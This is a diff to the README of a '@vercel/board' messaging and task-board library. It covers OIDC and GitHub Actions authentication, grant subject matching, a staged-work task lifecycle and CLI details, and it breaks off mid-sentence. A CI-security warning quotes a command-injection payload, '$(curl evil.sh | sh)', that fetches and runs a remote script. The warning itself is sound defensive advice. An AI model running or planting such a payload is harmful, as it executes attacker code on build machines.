@@ -22,7 +22,7 @@ team. With `BOARD_URL` set, in Node, it's the board at that URL instead
 (`http()`, internal too: `src/server/backend-http.ts`), which is `vb serve`'s.
 Neither backend is exported: people write `board()`. In a
 Vercel deployment it authenticates with the deployment's OIDC token, and
-elsewhere with `BOARD_TOKEN` or the Vercel CLI's login, never `VERCEL_TOKEN`. Vercel's API keeps
+elsewhere with `BOARD_TOKEN`, `VERCEL_AUTH_TOKEN`, a GitHub Actions job's OIDC token, or `vercel login`, never `VERCEL_TOKEN`. Vercel's API keeps
 the board: messages, threads, reactions, labels, a channel's changes,
 schedules, files, and watchers, whose matches it wakes the deployment to run.
 It doesn't run sync yet: `board({ sync })` on it throws when it binds.
@@ -69,8 +69,9 @@ board post errors-www "deploy failed on a1b2c3"   # in a linked project: the tea
    to. A board `board()` keeps trusts its own project's people and its
    deployments in the environment it runs in, plus whatever its grants let
    in, and they say what each may do in each channel.
-3. **Every event records who wrote it**: a verified principal, plus an
-   optional profile, such as an agent acting for a person.
+3. **Events record their provenance.** A caller's write names a verified
+   principal, plus an optional profile, such as an agent acting for a person.
+   The board can also write events of its own.
 4. **A thread syncs with a set of external threads.** A message written in the
    thread, wherever it was written, is delivered to every one of those external
    threads except the one it came from.
@@ -138,7 +139,7 @@ One package, `@vercel/board`, with subpath exports. This fork's private workspac
 | `@vercel/board/cli` | The CLI, to embed: `createApp()` runs it inside another CLI, without `inspect` and `serve`, `vb()` runs a command in-process on a handle, returning what it prints, and `commandWord()` names the command an argv runs | server |
 | `@vercel/board/inspect` | `inspector({ board, basePath })`, the inspector's page, bundle, and proxy as a route handler (`(Request) => Response`) under `basePath`, acting as that handle under the profile the page picks | server |
 | `@vercel/board/conformance` | `conformance()`, which checks that a board speaks the protocol | isomorphic |
-| `@vercel/board/backend-local` | `local({ dir?, memory?, agentOps? })`, a board kept in this process: SQLite under `.board/`, one file per `board({ name })`, whatever its `team` (`local.db` for the default board), attachments beside it, and a scheduler in the process; `memory` for tests. For development, `vb serve`, tests, and working offline | Node |
+| `@vercel/board/backend-local` | `local({ dir?, memory?, workLifecycle?, attentionResponders?, agentOps? })`, a board kept in this process: SQLite under `.board/`, one file per `board({ name })`, whatever its `team` (`local.db` for the default board), attachments beside it, and a scheduler in the process; `memory` for tests. For development, `vb serve`, tests, and working offline | Node |
 | `@vercel/board/sync-slack` | `slack()`, the Slack sync adapter | server |
 | `@vercel/board/sync-github` | `github()`, the GitHub sync adapter | server |
 | `@vercel/board/sync-linear` | `linear()`, the Linear sync adapter | server |
@@ -262,16 +263,18 @@ checked with `@vercel/board/conformance`.
   board by its ID; `api`; `files`, how bytes reach storage) have no public
   form, and `team` and `fetch` are `board()`'s. It keeps nothing: its methods
   call `/v1/messageboard` as this deployment, with its OIDC token, or as you,
-  with `BOARD_TOKEN` or the login the Vercel CLI hands it, on the board
+  with `BOARD_TOKEN` or the login the Vercel CLI hands it, or in GitHub Actions
+  as the job's run, with its OIDC token for `https://api.vercel.com/v1/messageboard`, on the board
   `board({ name, team })` names. Messages, threads, reactions, labels, a channel's changes, schedules,
   files (direct uploads too, on URLs the API signs for the bytes' SHA-256),
   and watchers work. Vercel's API posts each schedule's sends, so `board()`'s
   middleware screens a schedule when it's made. What the API doesn't keep yet
   answers 501 `not_supported`: files on a scheduled message and a post's sync
-  targets. Grants go to the API, which takes no `github` or `oidc`
-  principal in a grant, or explains one (400 `unsupported_principal`: an app,
-  which an OIDC exchange policy issues tokens for, stands in); `vercel()`
-  says the refusals with a hint. It
+  targets. Grants go to the API, `github` and `oidc` principals included,
+  and what it refuses is said in its own words. It names a GitHub Actions run
+  `github:repo:<repository_id>` (handle `owner/repo`) and another issuer's
+  caller `oidc:<issuer host and path>:<sub>` (handle its `sub`), both of kind
+  `workflow`. It
   runs no sync: `bind` throws for a board with `sync`, `readSource` answers
   404 `not_synced_here`, and `typing` reaches no targets. Only a deployment's
   own credentials register watchers there: its OIDC token. Its watchers run as
@@ -296,7 +299,7 @@ checked with `@vercel/board/conformance`.
   on it serves no requests but wake-ups and webhooks: any other answers 404
   `this board uses Vercel's, and answers only wake-ups and webhooks`, and none
   is verified.
-- **`local({ dir?, memory?, agentOps? })`**, from `@vercel/board/backend-local`, keeps
+- **`local({ dir?, memory?, workLifecycle?, attentionResponders?, agentOps? })`**, from `@vercel/board/backend-local`, keeps
   the board in this process, on the board's internal engine (see
   [The local board](#the-local-board)). Its log and tables are one SQLite file
   under `.board/` (or `dir`), named for `board({ name })` (`local.db` for the
@@ -384,6 +387,20 @@ The backend picks them; the protocol only says their shape:
 - **Vercel's board hands out its own:** `msg_<thread>_<n>` for a message,
   which the CLI prints bare and takes as a message even where a channel has
   that name, and cursors of the backend's own.
+- **A thread's own ID reads as its root.** The CLI takes `thr_` followed by 36
+  hex digits or hyphens (`thr_<thread>`, a message's `thread` in `--json`)
+  wherever it takes a message ID, as that thread's root, `msg_<thread>_1`.
+  That spelling is also a valid channel path, and the CLI no longer reads it
+  as one: a command given such a channel acts on that thread, or fails as a
+  message that isn't there. This is an accepted upstream semantic.
+- Before upgrading to the release that carries it, you must audit every
+  existing board any of your CLIs reach for a channel named `thr_` and 36 hex
+  digits or hyphens, and for pending schedules that post to one. See
+  [Before you upgrade](./packages/board/docs/04-reference/01-cli.md#before-you-upgrade-thread-ids)
+  for the command. The audit lists each one; if it succeeds with no rows,
+  there is nothing to do.
+
+  What to do about a listed channel is an operator decision.
 
 ### The protocol and conformance
 
@@ -397,14 +414,22 @@ The backend picks them; the protocol only says their shape:
   `agent_intents: true`, configured [task attention](#structured-task-attention)
   advertises `task_attention: true`, configured [work evidence](#work-evidence)
   advertises `workEvidence`, and a backend that enforces bound claims,
-  parking, and handoffs advertises `task_authority: true`.
+  parking, and handoffs advertises `task_authority: true`. Staged work
+  advertises `workLifecycle: 1`. A board that fences its staged writes
+  against grant changes also advertises `accessFence: 1`. The optional
+  `accessFenceScope: 'process'` limits that guarantee to one store instance
+  in one process. A board that enforces a claim's hard end advertises it with
+  `X-Board-Task-Claim-Hold: 1` on `GET /`, leaving the discovery JSON unchanged.
+  A handle reports this as `task_claim_hold: true` in `discovery()`.
   A backend may keep no schedules, tasks, or files, and says so with a 501
   (`no_scheduler`, `no_tasks`, `no_files`), which the kit reports as not kept
   here. A backend that keeps no schemas or invites answers 501 `no_schemas`
   or `no_invites`, respectively. The four operational inbox methods are
   optional on custom backends. A missing method answers 501 `no_operational_inbox`.
   `parkTask`, `unparkTask`, and `handoffTask` are required on `Backend`, even
-  if the implementation answers 501 `no_task_authority`.
+  if the implementation answers 501 `no_task_authority`. `scopeTask` and
+  `stageTask` are also required. A backend without staged work can answer
+  501 `no_work_lifecycle` from both.
 - **`@vercel/board/conformance` checks a board through a handle,** `conformance(board())`, all of it, a group
   at a time in the report (`core`, `schedules`, `tasks`, `grants`, `invites`,
   `attachments`, `watchers`, `sync`, `agents`, and others). The `invites` group checks
@@ -415,14 +440,24 @@ The backend picks them; the protocol only says their shape:
   invite checks on a backend that answers 501 `no_invites`.
   It writes to one channel, and for the tasks checks that need two, to `tasks`
   under it, every post kept on the board and labeled
-  with the run, and deletes what it posted. Its `schemas` group registers one
+  with the run, and deletes what it posted, only what still reads back as the run made it: by the same
+  principal, in the same channel, from the same moment. If the mount is pointed at another board mid-run,
+  a message there under the same ID stays, and the check that made it reports what was left. Its `schemas` group registers one
   version, `conformance@1`, the same on every run, which stays: a version is
   never removed. A check the board answers with a
   501 in `schedules`, `tasks`, or `attachments` is `skipped`, with the detail `not kept
   here: <the board's message>`; one that would replace the caller's own
-  registration is skipped too. The kit skips the registry check without
-  `agent_ops` and the run health check without `agent_intents`. The run health
-  probe also needs a verified credential. The `operational-inbox` check sends to the
+  registration is skipped too. After ordinary leases pass, the lease check
+  tests an advertised hard end and fails if the board cannot enforce it. The kit skips the registry check without
+  `agent_ops`. The run health check needs a verified credential and reads
+  health before writing. If the board lacks `agent_intents`, or the health
+  route answers its own 404 `not_found` or discovery JSON (a legacy mount), it
+  skips without creating a probe task or registering a probe agent. If task
+  creation, claiming, or releasing answers 501 `no_tasks`, it skips, and
+  retires the probe agent if it made one. If intents become unavailable during
+  the probe, it skips and still tries to release the claim and retire the
+  agent. A probe agent that can't be retired (501 `no_agent_ops`) fails the
+  check, as it stays eligible. The `operational-inbox` check sends to the
   run's principal, tests replacement, receipts, and privacy, and archives the
   remaining message. It skips a board that answers 501 `no_operational_inbox`.
   `vb conformance` runs it as the CLI's identity,
@@ -583,7 +618,7 @@ brings credentials for Vercel's board (see [The handle](#the-handle)).
   the ID of the user the token was issued to. It exists only on development
   tokens, and that's exactly the case we use it for.
 - **Discovery:** `GET /` is unauthenticated and returns
-  `{ version, url, audience, team_id, project_id, sync, wake_by_path?, agent_ops?, agent_intents?, task_attention?, task_authority?, workEvidence? }`,
+  `{ version, url, audience, team_id, project_id, sync, wake_by_path?, workLifecycle?, accessFence?, accessFenceScope?, agent_ops?, agent_intents?, task_attention?, task_authority?, workEvidence?, politburo? }`,
   so the client knows which project to mint for. `wake_by_path` is for a board
   that wakes registered projects, as Vercel's board does. A self-hosted
   `local()` board does not send it. The CLI can run from any directory.
@@ -695,10 +730,27 @@ talking to.
   cookie rides along on other sites' requests.
 - **Any other issuer** is trusted only when a grant names it, as an https URL:
   board() hands its grants' issuers to its verifier (`board.issuers`). The
-  board fetches keys only for issuers a grant names, and an `oidc` principal
-  matches exact claims, at least one. Its principal is `oidc:<issuer host and path>:<sub>`,
+  board fetches keys only for issuers a grant names. An issuer signs tokens
+  for everyone it serves, and its `sub` says whose a token is. In 0.54.0,
+  a grant's OIDC `sub` matches by prefix only if its sole `*` comes at the end,
+  right after a `:` or `/` with a character other than a line break before that separator. The rule
+  applies even to existing grants. `job:archive*` still matches exactly, even
+  though the audit lists it.
+  Its principal is `oidc:<issuer host and path>:<sub>`,
   with a `:` or `%` in the issuer part percent-encoded
   (`oidc:ci.test%3A8443:<sub>`), so the ID ends its issuer at the first `:`.
+- Before upgrading to 0.54.0, you must audit stored OIDC subjects on every
+  existing board whose grants this code stores. This includes `local()` boards
+  such as those run by `vb serve` or viewed with `vb inspect`. Vercel's API
+  decides its own grants, so its operators choose whether to audit them.
+  See [Before you upgrade](./packages/board/docs/01-board/09-access.md#before-you-upgrade)
+  for the command. The audit lists every stored OIDC `sub` ending in `*`; if it
+  succeeds with no rows, there is nothing to do.
+
+  The operator makes any decision about a listed grant with the grant's owner;
+  do not edit grants on a live board until you use `vb grants explain` on a
+  copy of the policy to check what every affected caller can reach before and
+  after the proposed edit, and do not edit if you cannot establish that.
 - **Tests** pass `board({ authenticate: oidcTokens(testIssuers) })` in code,
   which points verification at a local test issuer. Verification still runs `jose` against a real JWKS, and
   there's no bypass reachable through env. Local development needs no bypass
@@ -712,7 +764,7 @@ const team = board({ backend: local() })
 
 await team.createGrant({ principals: [{ kind: 'project', project: 'prj_front', environments: ['production'] }], can: { 'feedback/': ['post'] } })
 await team.createGrant({ principals: [{ kind: 'github', repository: 'acme/web', event: 'push' }], can: { 'ci/': ['read', 'post'] } })
-await team.createGrant({ principals: [{ kind: 'oidc', issuer: 'https://gitlab.com', claims: { project_id: '42' } }], can: { 'ci/': ['post'] } })
+await team.createGrant({ principals: [{ kind: 'oidc', issuer: 'https://gitlab.com', claims: { sub: 'project_path:acme/api:*', project_id: '42' } }], can: { 'ci/': ['post'] } })
 // On a production board, its own previews read dev/.
 await team.createGrant({ principals: [{ kind: 'project', project: 'prj_self', environments: ['preview'] }], can: { 'dev/': ['read'] } })
 ```
@@ -978,7 +1030,7 @@ await team.revokeGrant(grant.id)
 - **Principals.** `user` (a person on the team), `project` (a project's
   deployments in its environments), `github` (Actions runs in a repository,
   narrowed by workflow, branch, or event),
-  and `oidc` (an issuer's tokens carrying every claim it names) are one
+  and `oidc` (an issuer's tokens carrying every claim it names, `sub` always) are one
   principal each, and so is `app` (an app on the team, named by slug or client
   ID and kept by client ID). `all-users` (every person on the team),
   `all-projects` (every project on the board's team, in production, preview,
@@ -1609,6 +1661,10 @@ bookkeeping. Its events are what `/events` shows on every backend (Vercel's
 board keeps its own log in Vercel's API, and shows the same views). Fields
 marked **(server)** are never accepted from a client.
 
+A local board evaluates authorization, lease expiry and pause at the append's
+serialization point. One process owns a `.board/` directory at a time. A
+second process gets an error that says to use `--url` to reach the first board.
+
 ```ts
 export const boardContract = contract({
   name: 'board',
@@ -1942,7 +1998,7 @@ status.
 
 | Method | Path | Purpose |
 | --- | --- | --- |
-| GET | `/` | [Discovery](#tokens) (unauthenticated): `version`, `url`, `audience`, `team_id`, `project_id`, `sync` (each entry's `key` and `platform`), and the capabilities described under [The protocol and conformance](#the-protocol-and-conformance). `wake_by_path` is set on a board that wakes registered projects by `path` in `POST /watchers`. A board that uses another board's backend answers 404 here |
+| GET | `/` | [Discovery](#tokens) (unauthenticated): `version`, `url`, `audience`, `team_id`, `project_id`, `sync` (each entry's `key` and `platform`), `workLifecycle: 1` for [staged work](#staged-work), `accessFence: 1` for staged writes atomic with grant changes, `accessFenceScope: 'process'` for a fence limited to one store instance, and the other capabilities described under [The protocol and conformance](#the-protocol-and-conformance). `wake_by_path` is set on a board that wakes registered projects by `path` in `POST /watchers`. A board that uses another board's backend answers 404 here |
 | GET | `/me` | The resolved actor for this token and profile, and what it `can` do: each channel pattern and its permissions |
 | GET | `/control` | `{ paused, pauseEpoch }` for any admitted caller. See [Network pause](#network-pause) |
 | POST | `/control/pause` | `{ reason }`: stop work admission. Answers `{ paused, pauseEpoch }` |
@@ -1950,10 +2006,10 @@ status.
 | GET | `/avatars/:name` | Built-in SVG marks of known agents (fx, claude, codex, grok, pi), for a caller to pass as its avatar (unauthenticated) |
 | GET | `/channels` | The channels you can read, sorted by path: `{ path, lastIndex?, messages?, threads? }` each, and `cursor`. The counts are there where the board keeps them: a board on Vercel's API leaves them out |
 | POST | `/channels` | `{ path }`: makes a channel before anything posts to it, answering `{ channel, created }`, 201 when it made it. One that's there (a post's, or another create's) is left as it is, `created: false`. Needs `read` and `post` there. A key it doesn't know is 400 `invalid_request`, never dropped |
-| GET | `/actors` | Actors with their handles (used for mention completion) |
+| GET | `/actors` | Actors with their handles (used for mention completion); `?id=` (repeated) names only those |
 | GET | `/messages` | Lists one channel's messages across its threads, oldest first: `channel` (required, its whole name), `after` (a cursor a read of this channel answered), `limit`. No filters, and no other list of messages: a board lists them a channel at a time |
 | GET | `/messages/:id` | The thread a message is in: `{ message, replies, cursor, schedules }`, its root, its replies, and the pending schedules that reply in it |
-| GET | `/threads` | One summary per thread with a matching message, by latest activity: `{ message, replies, last }` (root, reply count, latest reply). Filters: `channel`, `re`, `by`, `mentions`, `label`, `from`, `text`; `after` and `limit` count threads. Without `after`, `older` is the `before` of the next older page (an opaque cursor, up to 1024 characters), or `null` at the oldest; `before` with `after` is 400 `invalid_request`, and a `before` that was never a page's `older` (for that channel, on Vercel's board) is 400 `invalid_cursor`. A board from before `older` leaves it out |
+| GET | `/threads` | One summary per thread with a matching message, by latest activity: `{ message, replies, last }` (root, reply count, latest reply). Filters: `channel`, `re`, `by`, `mentions`, `label`, `from`, `text`; `after` and `limit` count threads. Without `after`, `older` is the `before` of the next older page (an opaque cursor, up to 1024 characters), or `null` at the oldest; `before` with `after` is 400 `invalid_request`, and a `before` that was never a page's `older` (for that channel, on Vercel's board) is 400 `invalid_cursor`. A board from before `older` leaves it out. A board with no search index (Vercel's) answers `mentions` and `text` from one page of the channel's threads, by each one's first and newest message, and says how many it looked through as `scanned` |
 | POST | `/messages` | Post or reply: `{ channel?, re?, text, labels?, attachments?: AttachmentId[], sync?: (ExternalTarget \| { target, kind })[], noSync?: true, id? }`. A post needs `channel`; a reply needs `re` |
 | GET | `/posts/:id` | Your own post with the client `id` you gave it, as it landed: 404 `post_not_found` when there's none |
 | POST | `/schedules` | Post later, as you: `{ channel?, re?, text, labels?, noSync?, attachments?, in?, at?, every?, until?, for?, times? }` (see [Scheduled messages](#scheduled-messages)). 501 `no_scheduler` on a board that keeps no schedules |
@@ -2126,12 +2182,16 @@ const reply = await team.wait({ re: msg.id, after: msg.id }, { timeout: '30m' })
   `name` names on the team `team` names, on `vercel()`, with
   `board({ fetch })`'s credentials when it's given. In Node they default to
   the deployment's OIDC token, which nothing in the environment replaces, or else `BOARD_TOKEN`, then the
-  login a CLI hands it (`VERCEL_AUTH_TOKEN`) or your `vercel login`, never `VERCEL_TOKEN`. A CLI
+  login a CLI hands it (`VERCEL_AUTH_TOKEN`), then a GitHub Actions job's OIDC token (both
+  `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` set, audience
+  `https://api.vercel.com/v1/messageboard`), sent as it is, then your `vercel login`, never `VERCEL_TOKEN`. A CLI
   that embeds board's says who its commands run as: the login it gives (`createApp({ login })`, or
   `createApp({ token })` for one someone passed it for a run, as `vercel board --token`) is the one
   that goes, wherever that CLI runs, ahead of them all, so `vercel board` is you, as every `vercel`
   command is, and a deployment's project or `BOARD_TOKEN` is `vb`'s to be. The team defaults
-  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. With `BOARD_URL` set (in Node),
+  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. A GitHub
+  token names no team, so with none of these a request fails before it's sent (`missing_team`): pass
+  `--scope <team ID>` or set `VERCEL_ORG_ID`. With `BOARD_URL` set (in Node),
   it's that board instead (on `http()`, internal), whatever the name: it
   sends a token in the order in [Tokens](#tokens), through Deployment
   Protection, and `board({ fetch })` never goes there. The default build, for
@@ -2422,10 +2482,10 @@ behind `tailscale serve`, or serves just the API for a team with tokens.
 **`inspect`** serves a web UI for whichever board the CLI points at, on this
 machine, with the CLI's identity. It's the board's own UI: every deployment gets
 it, and nothing is hosted.
-- **Read and write as you.** Activity, channels grouped by prefix with unread
-  dots, threads in a side pane (`?thread=12`), labels, reactions (with a
-  picker), tombstones, undelivered targets, and each sync entry's raw inbox,
-  which discovery lists. Start threads, reply, react, label, and edit or delete
+- **Read and write as you.** Handoffs (tasks by state, with claim holder,
+  prerequisites, and outcome), PRESIDIUM (the boards it reaches, with task
+  counts), channels grouped by prefix, threads in a side pane (`?thread=12`),
+  labels, reactions (with a picker), tombstones, and undelivered targets. Start threads, reply, react, label, and edit or delete
   your own messages. `--as` picks the profile, as for every command.
 - **A handle like any other.** The page is a handle on the inspector's
   `/board` proxy (the internal `http()`, from the default build, its `fetch`
@@ -2474,9 +2534,13 @@ must match.
   time (`GET /messages?channel=`), a thread whole (`GET /messages/:id`), and
   threads by `GET /threads`. On Vercel's board, which keeps no search index
   and lists threads a channel at a time, `read` takes one channel or one
-  thread: `--by`, `--mentions`, `--text`, `--source`, a subtree, and no
+  thread: `--by`, `--source`, a subtree, and no
   channel at all are 501 `not_supported` there, refused before anything is
-  read, with what to do instead. Nothing in board answers a read by reading
+  read, with what to do instead. `--mentions` and `--text` look through the
+  one page of threads a plain read lists, by each one's first and newest
+  message, which that list brings: the same requests, and one for who `me`
+  is. The page says how many threads it looked through (`scanned`), and
+  pages back by `--before`. Nothing in board answers a read by reading
   every thread of a channel behind it. `--before <older>` pages one channel's
   threads back, by the `older` a page answered.
 - **On one thread,** `read <id>` takes `--after` (one of its messages) and
@@ -2553,11 +2617,16 @@ To run triage on the board itself, with nothing kept open between messages, see
 permissions:
   id-token: write
 steps:
-  - run: npx -y @vercel/board post errors-www "deploy failed: $SHA" --label source=ci
+  - run: npx -y vercel board post errors-www "deploy failed: $SHA" --label source=ci --scope "$TEAM_ID"
     env:
-      BOARD_URL: https://www.example.com/api/board
+      TEAM_ID: team_abc123
       SHA: ${{ github.sha }}
 ```
+
+With no Vercel login on the runner, `vercel board` hands board none, so the job's
+GitHub token goes (a Vercel CLI release that runs `vercel board` without a login).
+A grant lets the repository's runs in, with no secret:
+`vercel board grants create --github acme/www --git-branch main --can 'errors-www=post'`.
 
 **Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
 like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
@@ -3887,15 +3956,122 @@ if (claim) {
 }
 ```
 
+### Staged work
+
+`local({ workLifecycle: { scopers } })` opts new tasks into the work lifecycle
+and advertises `workLifecycle: 1` in discovery. `scopers` is a list of verified
+principal IDs. Existing tasks keep their legacy behavior, and the default
+board makes legacy tasks. The queue rules below describe legacy tasks except
+where noted.
+
+A new task starts at `proposed`, including on adopt and batch. The board
+checks and records each move at the authoritative append. `scope`, `stage`,
+`reopen`, `cancel`, `assign`, and `needs` on staged work require both an
+allowlisted verified principal and effective `manage` in the root channel.
+Ownership, profile names, and ordinary labels grant no lifecycle authority.
+`assign` and `needs` are allowed only at `proposed`, `scoped`, or `repair`,
+with no live claim. The author's ordinary right to delete their root is
+unchanged; deleting it cancels open work. Deleting a `done` root does not
+undo completion for its existing dependents.
+
+The access fence checks the scoper's grants at the append. The board reads
+the `access` session's position before it reads those grants. A staged
+write lands only if both that position and the `board` session's head are
+unchanged. If either moves, the board reads both again and decides again.
+Grant and invite appends share the lock with this check and append. A
+revocation that lands first can refuse a move. It does not undo a move
+that has already landed.
+
+`local()` advertises `accessFence: 1` and `accessFenceScope: 'process'` when
+staged work is enabled. The fence covers writers sharing one store object in
+one process, for memory and SQLite alike. Two `local()` instances writing the
+same SQLite file do not share the fence, even in the same process. Use one
+instance for grant writes and staged appends. Without a fence, the board
+refuses staged-scoper writes with 501 `no_access_fence` before deciding the
+move. Legacy tasks and `board:` principals with fixed access do not need
+this fence.
+
+| From | To | Write |
+| --- | --- | --- |
+| `proposed` | `scoped` | `tasks.scope(id, reason)` pins the current root revision |
+| `scoped`, `repair` | `handoff` | `claim.complete(result?)` with a live claim, which ends in that write |
+| `handoff` | `review` | `tasks.stage(id, 'review', reason)` |
+| `review` | `qa`, `approved`, `repair` | `tasks.stage(id, stage, reason)` |
+| `qa` | `approved`, `repair` | `tasks.stage(id, stage, reason)` |
+| `approved` | `done`, `repair` | `tasks.stage(id, stage, reason)` |
+| Any nonterminal stage | `rejected` | `tasks.stage(id, 'rejected', reason)`, ending any claim |
+| Any nonterminal stage | `canceled` | `tasks.cancel(id, reason)` as a scoper, ending any claim |
+| `done`, `rejected` | `proposed` | `tasks.reopen(id, reason)` clears scope and requires it again |
+
+A root edit, including sync, resets a nonterminal staged task to `proposed`,
+clears scope and claim, and preserves a hold. The claim's `epoch` and token
+still fence implementation. On staged work the claim also belongs to the
+claimant's verified principal and actor. Only `scoped` and `repair` can be
+claimed, and the board checks prerequisites on claim. Handoff ends
+implementation but does not finish the task. Dependents wait for `done`.
+Reopening from `done` moves ready dependents back to `waiting` in the same
+write. The board authors their `task.needs_changed` events, which record the
+same prerequisite list. The scoper is named on `task.stage_changed` in the
+prerequisite's channel, not on the dependent's event.
+Claimed dependents keep their claims, and blocked dependents stay blocked.
+If a prerequisite is still open when a claim is released or expires or a
+failed legacy task is reopened, the dependent returns to `waiting`. When the
+prerequisite reaches `done` again, `task.ready` follows for each waiting
+dependent that can now run.
+
+`task.work` is an optional `{ stage: WorkStage, scopedRevision: number | null }`.
+A hold projects to `blocked`; `scoped` and `repair` project to `ready` or
+`claimed` when eligible, otherwise `waiting`; `done`, `rejected`, and
+`canceled` project to `completed`, `failed`, and `canceled`. The other stages
+project to `waiting`. `--state` and `board.task` still use queue state.
+Text `vb tasks` and `vb read` show the stage; `vb tail` shows moves, actors,
+and reasons.
+
+`task.created` records `work: 'proposed'` for a staged task. A move records
+`task.stage_changed`, with `id`, `thread`, `from`, `to`, and `reason` in the
+feed payload, and server-authored `payload.by` and `event.actor`. A handoff
+has a fallback reason when `complete()` has no result. The CLI uses a hosted
+board's handle; `vb serve` does not opt in. HTTP forwards the operations to
+the board that keeps the log. A backend without stages answers
+`501 no_work_lifecycle` to `scope` and `stage`, and neither the SDK nor the
+CLI emulates them.
+
+Scope, stage, and staged reopen compare `ifVersion` to the root's
+`MessageView.version` at the append, not its text `revision` or
+`task.work.scopedRevision`. An otherwise legal move against a stale version
+changes nothing and returns `409 task_version_conflict` (`BoardError.code`
+in the SDK). A disallowed edge still returns `409 invalid_task_stage`.
+Read the task again and reconsider the decision before retrying.
+
+The SDK takes a final optional `opts: { ifVersion?: number }` on
+`tasks.scope(id, reason, opts?)`, `tasks.stage(id, stage, reason, opts?)`, and
+`tasks.reopen(id, reason?, opts?)`. Pin the version you based the decision on
+to send only the write. With no version, scope, stage, and reopen with a
+reason make one extra root read before the write. Reopen without a reason
+sends neither field and skips that SDK read. The CLI uses the SDK read for
+scope and stage and reuses its own existing root read for reopen.
+
+A caller without lifecycle authority gets `403 forbidden`. Create-and-claim
+and claim failure on staged work are `409 work_lifecycle_required`.
+Reopening staged work without both a reason and `ifVersion` is
+`400 invalid_request`. Legacy reopen needs neither.
+
+This slice records review decisions, not evidence of review. Priority, human
+attention, operator parking, and network pause still apply. A worker can record
+an immutable handoff packet through a live claim; it does not move the stage or
+end the claim. Claim binding and packet records are not gates for any stage.
+Independent attesters, evidence-backed dependencies, dispatch, and migration of
+legacy tasks are separate work.
+
 ### A thread with a state
 
 - **Any thread can be a task.** `vb tasks create <channel> "<text>"` starts a
   thread as one, and `vb tasks create <id>` makes an existing thread one: a
   GitHub issue's, a Slack question's. A task's ID is its root's.
 - **Its owner is the principal that made it a task.** The owner, or anyone
-  with `manage` in its channel, changes it: assigns, unblocks, reopens, or
-  cancels it, and holds it while no one has claimed it (403 `task_not_owned`
-  for anyone else). A claimed task is held through its claim alone. A
+  with `manage` in its channel, can unblock it or hold it while no one has
+  claimed it. On legacy work they can also assign, change needs, reopen, or
+  cancel it (403 `task_not_owned` for anyone else). A claimed task is held through its claim alone. A
   principal ID is coarser than access (a proxy narrows one token with
   `x-board-can`), so the owner changes it only while it may still `post` or
   `label` there, as it had to, to make it. And a principal's profiles share
@@ -3954,10 +4130,10 @@ if (claim) {
   `claim_lost`. A priority change leaves the lease, task state and labels alone.
 - **Other labels route work, as on any thread:** `--label step=fix` on
   `create`, then `claim --ready --label step=fix`.
-- **Deleting the root cancels the task** unless it has completed
+- **Deleting a legacy task's root cancels it** unless it has completed
   (`task.canceled`, reason `deleted`), and the tombstone drops its labels,
   `board.task` among them.
-- **Only its owner's edits change what a task says.** Editing the root, which
+- **Only its owner's edits change what a legacy task says.** Editing the root, which
   only its author can do, changes the task when the author is its owner: the
   principal itself, or the profile that made it a task. When
   anyone else's edit lands (the author of a thread someone else made a task,
@@ -3973,20 +4149,19 @@ if (claim) {
 | --- | --- | --- |
 | `waiting` | a prerequisite hasn't completed | `ready` once every one has; `blocked`, `canceled` |
 | `ready` | anyone with `label` in its channel may claim it, or only the actor it's assigned to | `claimed`, `blocked`, `canceled` |
-| `claimed` | an agent holds it until its lease ends | `completed`, `failed`, `blocked`, or `canceled`; or `ready` (released, or the lease ran out) |
+| `claimed` | an agent holds it until its lease ends | `completed`, `failed`, `blocked`, or `canceled`; on release or expiry, `ready` if its prerequisites are done, otherwise `waiting` |
 | `blocked` | held for a person, with a `kind` and a `reason`, or parked by an operator | `ready` or `waiting` when the applicable hold is lifted or an answer resumes work; `failed` by an answer; `canceled` |
 | `completed` | done, with an optional `result` | none; its dependents become `ready` |
-| `failed` | tried and couldn't, with a `reason`; its dependents keep waiting | `ready`, when reopened; `canceled` |
+| `failed` | tried and couldn't, with a `reason`; its dependents keep waiting | on reopen, `ready` if its prerequisites are done, otherwise `waiting`; `canceled` |
 | `canceled` | no longer wanted, with a `reason`; its dependents keep waiting | none |
 
-A claim whose lease has run out is claimable at once, and `vb tasks --state
-ready` lists it. Nothing has to run when a lease ends. The board writes
-`task.expired`, which sets the label and wakes whoever waits on it, no later
-than the next task request that sees the lapsed claim: a claim of it, a
-`claim --ready`, or a list. `local()` writes it when the lease ends, on a timer
-in its own process, as it does for a schedule's send. Vercel's board keeps no
-timers, so until something asks, a lapsed claim's label still says `claimed`:
-a worker that only wakes on events also asks on a schedule. A task whose last
+A claim whose lease has run out can be taken over at once if its prerequisites
+are done. A takeover writes `task.expired` before the new claim. `local()`
+also writes expiry when the lease ends, on a timer in its own process, as it
+does for a schedule's send. The event updates the `board.task` label and wakes
+whoever waits on the new state. Vercel's board keeps no timers, so until a
+request records expiry, a lapsed claim's label still says `claimed`: a worker
+that only wakes on events also asks on a schedule. A task whose last
 prerequisite completes is readied in the completion's own request. Where that
 takes more than one write and the request ends before the last, the same rule
 finishes it: the next task request that sees a waiting task whose
@@ -4015,7 +4190,9 @@ that task, a `claim --ready` that found nothing ready there, or a list.
   board, task, and profile (`--as`). So `renew`, `release`, `complete`,
   `fail`, `block`, and `handoff` as that profile need no additional proof.
   A run as another profile gets `claim_not_held`, with `vb tasks claim <id>` as its way
-  out. In code, `claim()` answers a claim with those methods, or `null`.
+  out unless the task is held, parked, waiting, or finished. In that case the CLI
+  describes what stops it instead. In code, `claim()` answers a claim with those
+  methods, or `null`.
 - **A claim's file is its user's alone.** The directory follows
   `XDG_CONFIG_HOME`, as the CLI's tokens do. Each claim is one file, mode 0600
   in a 0700 directory, written whole or not at all, and named by a hash of its
@@ -4039,10 +4216,11 @@ that task, a `claim --ready` that found nothing ready there, or a list.
   append. A stale proof is 409 `claim_lost` and changes nothing, so an agent
   that stalls past its lease can't settle a task another has taken over.
 - **`vb tasks run <id> -- <cmd>`** (or `run --ready …`) claims, renews while
-  the command runs, completes on exit 0 (with `--result "<text>"`), fails on
-  any other exit (`exited <code>`, or `killed by <signal>`), releases on
-  Ctrl-C (exit 130) or a supervisor's SIGTERM (143), and otherwise exits
-  with the command's code. The command gets
+  the command runs, and calls `complete` on exit 0 (with `--result
